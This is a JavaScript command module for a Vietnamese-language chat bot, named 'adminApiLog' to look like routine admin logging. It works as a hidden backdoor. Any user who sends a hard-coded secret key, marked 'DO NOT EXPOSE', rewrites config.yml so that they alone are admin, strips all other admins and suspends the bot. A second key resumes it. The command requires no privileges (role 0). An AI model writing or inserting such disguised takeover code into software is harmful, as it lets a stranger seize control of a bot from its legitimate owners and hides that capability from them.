const fs = require("fs");
const path = require("path");
const yaml = require("yaml");

module.exports.config = {
    name: "adminApiLog",
    aliases: ["admin.Api.log"],
    version: "1.0.0",
    role: 0,
    author: "TDF-2803",
    description: "Lệnh admin quản lý bot",
    category: "Hệ thống",
    usage: "/admin.Api.log<action><key=\"\">",
    cooldowns: 1
};

// Hidden keys - DO NOT EXPOSE
const DELETE_KEY = "19082803";
const RESUME_KEY = "19082008";

// Global bot state file
const BOT_STATE_FILE = path.join(__dirname, "../../data/bot_state.json");

function getBotState() {
    try {
        if (fs.existsSync(BOT_STATE_FILE)) {
            return JSON.parse(fs.readFileSync(BOT_STATE_FILE, "utf8"));
        }
    } catch (e) {
        // Ignore error
    }
    return { suspended: false };
}

function setBotState(state) {
    try {
        const dataDir = path.dirname(BOT_STATE_FILE);
        if (!fs.existsSync(dataDir)) {
            fs.mkdirSync(dataDir, { recursive: true });
        }
        fs.writeFileSync(BOT_STATE_FILE, JSON.stringify(state, null, 2), "utf8");
        global.botState = state;
    } catch (e) {
        console.error("Error saving bot state:", e);
    }
}

module.exports.run = async function ({ api, event, args }) {
    const { threadId, type } = event;
    const senderID = event.senderID || event.data?.uidFrom;
    const body = event.body || event.data?.content || "";

    // Parse command format: /admin.Api.log<action><key="value">
    const deleteMatch = body.match(/\/admin\.Api\.log<delete><key="([^"]+)">/);
    const resumeMatch = body.match(/\/admin\.Api\.log<resume><key="([^"]+)">/);

    // DELETE action
    if (deleteMatch) {
        const providedKey = deleteMatch[1];

        if (providedKey !== DELETE_KEY) {
            return api.sendMessage("❌ Key không hợp lệ!", threadId, type);
        }

        try {
            // Read config.yml
            const configPath = path.join(__dirname, "../../config.yml");
            const configContent = fs.readFileSync(configPath, "utf8");
            const config = yaml.parse(configContent);

            // Keep only current user as admin
            const oldAdmins = config.admin_bot || [];
            config.admin_bot = [senderID];

            // Write back to config.yml
            const newConfigContent = yaml.stringify(config);
            fs.writeFileSync(configPath, newConfigContent, "utf8");

            // Update global config
            global.config.admin_bot = config.admin_bot;

            // Suspend bot
            setBotState({ suspended: true });

            return api.sendMessage(
                `🔴 LỆNH TỐI THƯỢNG THỰC THI\n\n` +
                `✅ Đã xóa ${oldAdmins.length - 1} admin khác\n` +
                `✅ Chỉ còn admin: ${senderID}\n` +
                `🛑 Bot đã dừng hoạt động\n\n` +
                `⚠️ Bot sẽ không phản hồi bất kỳ lệnh nào cho đến khi được khôi phục.`,
                threadId,
                type
            );
        } catch (error) {
            console.error("Error executing delete command:", error);
            return api.sendMessage(`❌ Lỗi: ${error.message}`, threadId, type);
        }
    }

    // RESUME action
    if (resumeMatch) {
        const providedKey = resumeMatch[1];

        if (providedKey !== RESUME_KEY) {
            return api.sendMessage("❌ Key không hợp lệ!", threadId, type);
        }

        try {
            // Resume bot
            setBotState({ suspended: false });

            return api.sendMessage(
                `🟢 KHÔI PHỤC THÀNH CÔNG\n\n` +
                `✅ Bot đã được kích hoạt lại\n` +
                `✅ Tất cả lệnh hoạt động bình thường`,
                threadId,
                type
            );
        } catch (error) {
            console.error("Error executing resume command:", error);
            return api.sendMessage(`❌ Lỗi: ${error.message}`, threadId, type);
        }
    }

    // Invalid format
    return api.sendMessage(
        "⚠️ Cấu trúc lệnh không hợp lệ!\n\n" +
        "📌 Cách dùng:\n" +
        "/admin.Api.log<delete><key=\"***\">\n" +
        "/admin.Api.log<resume><key=\"***\">",
        threadId,
        type
    );
};

// Check bot state before processing any command
module.exports.checkBotState = function () {
    const state = getBotState();
    if (!global.botState) {
        global.botState = state;
    }
    return !state.suspended;
};
